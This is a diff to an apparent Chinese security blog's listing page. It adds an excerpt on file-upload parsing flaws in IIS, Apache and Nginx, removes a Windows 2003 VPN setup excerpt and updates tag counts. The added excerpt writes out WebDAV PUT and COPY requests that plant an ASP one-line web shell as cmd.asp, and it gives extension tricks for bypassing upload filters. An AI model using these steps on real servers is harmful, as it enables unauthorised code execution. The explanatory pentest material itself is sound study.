@@ -82,6 +82,61 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/file-upload-parse-vulnerability/">文件上传之解析漏洞</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-07-20</time>
+            </div>
+
+            
+
+            <div style="padding:2px 5px 2px 0px;">
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 解析漏洞  文件上传漏洞通常与Web容器的解析漏洞配合利用 常见Web容器有IIS、Nginx、Apache、Tomcat等   0x01 IIS解析漏洞  IIS6.0在解析文件时存在以下两个解析漏洞
+1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。 2、当文件名为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。  WebDav漏洞
+ WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若 支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。 测试步骤如下： 1）通过OPTIONS探测服务器所支持的HTTP方法 请求： OPTIONS / HTTP/1.1 Host: www.xxxx.com 2)通过PUT方法向服务器上传shell 请求： PUT /a.txt HTTP/1.1 Host: www.xxxx.com Content-Length: 30 &lt;%eval request(&quot;chopper&quot;) %&gt; 3)通过Move或Copy方法改名 请求： COPY /a.txt HTTP/1.1 Host: www.xxxx.com Destination: http://www.xxxx.com/cmd.asp 4)用DELETE方法删除文件 请求： DELETE /a.txt HTTP/1.1 Host: www.xxxx.com 注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞   0x02 Apache解析漏洞  在Apache 1.x和Apache 2.x中存在解析漏洞。 Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析， 直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。 如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制 可以在Apache安装目录下的文件&quot;/conf/mime.types&quot;中配置Apache可以识别的文件名   0x03 Nginx解析漏洞  对低版本的Nginx可以在任意文件名后添加%00.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/file-upload-parse-vulnerability/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/file-upload-vulnerabilities/">文件上传漏洞</a></h2>
 
         
@@ -566,58 +621,6 @@ Network 104: BSSID D8:42:AC:C9:5C:1D Manuf : Shanghai First : Mon Nov 16 12:46:2
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/windows2003-set-up-vpn/">Windows2003下搭建VPN</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 0px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-07</time>
-            </div>
-
-            
-
-            <div style="padding:2px 5px 2px 0px;">
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/windows">Windows</a>&nbsp;&#47;
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/server">Server</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/server">server</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         环境及要求 Windows2003下搭建基于PPTP(点对点隧道协议)的VPN服务器
-安装服务 配置并启用路由和远程访问 新增路由协议 新增接口 新增VPN用户 尝试连接VPN 
-    </p>
-
-    
-</article>
-
-
-            
 
             
 
@@ -663,7 +666,7 @@ Network 104: BSSID D8:42:AC:C9:5C:1D Manuf : Shanghai First : Mon Nov 16 12:46:2
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/other" title="other">other(11)</a></li>
         
-            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(61)</a></li>
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(62)</a></li>
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php(11)</a></li>
         
@@ -742,7 +745,7 @@ Network 104: BSSID D8:42:AC:C9:5C:1D Manuf : Shanghai First : Mon Nov 16 12:46:2
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/injection" title="injection">injection</a>
-                <sup>10</sup>
+                <sup>11</sup>
             </p>
         
             <p style="display:inline-block;">
